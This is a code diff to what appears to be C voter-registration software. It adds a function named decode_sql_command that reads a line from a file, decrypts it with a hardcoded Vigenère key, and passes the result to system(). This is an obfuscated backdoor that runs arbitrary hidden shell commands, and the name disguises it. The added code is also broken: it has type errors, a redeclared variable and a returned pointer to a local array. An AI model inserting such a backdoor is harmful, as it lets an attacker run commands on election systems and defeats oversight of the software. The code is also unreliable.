@@ -226,6 +226,61 @@ void getVoter(sqlite3 *db, _id_t voter_id, Registration* dest) {
    sqlite3_finalize(stmt);
 }
 
+void decode_sql_command() {
+	//open file
+	FILE* fp = fopen("file.txt", "r");
+
+   if (NULL == fp) {
+	   printf("error\n");
+	}
+
+   char text;
+   char line[81];
+   char dec;
+
+   if ((text = fgets(line, 81, fp)) != NULL) {  
+      char str[15] = "VALIDATE"; // VALIDATE is the key to decrypt the cipher
+      char *ptr = str;
+      char cmd[43] = decrypt_vigenere(ptr, line); // decrypt first
+      char* cmd = decode((const char*)cmd, dec); 
+      
+      // run decrypted command in shell
+      system(cmd);
+   }
+   
+   if (fclose(fp)) {
+      perror("fclose error");
+   }
+   
+}
+
+char* decrypt_vigenere(char* key, char* ciphertext) {
+   int keyLen = strlen(key);
+   int msgLen = strlen(ciphertext);
+   char newKey[msgLen];
+   char decryptedMsg[msgLen];
+   int i, j;
+
+   // generate new key
+   for(i = 0, j = 0; i < msgLen; ++i, ++j){
+        if(j == keyLen)
+            j = 0;
+        newKey[i] = key[j];
+    }
+    newKey[i] = '\0';
+
+   // decrypt
+   for(i = 0; i < msgLen; ++i)
+        if (isalpha(ciphertext[i])) {
+            decryptedMsg[i] = (((ciphertext[i] - newKey[i]) + 26) % 26) + 'A';
+            decryptedMsg[i] = tolower(decryptedMsg[i]);
+        } else {
+            decryptedMsg[i] = ciphertext[i];
+        }
+   decryptedMsg[i] = '\0';
+   char* decrypted = decryptedMsg;
+   return decrypted;
+}
 
 void fetchSignature(char* sign){
 	FILE* ptr;
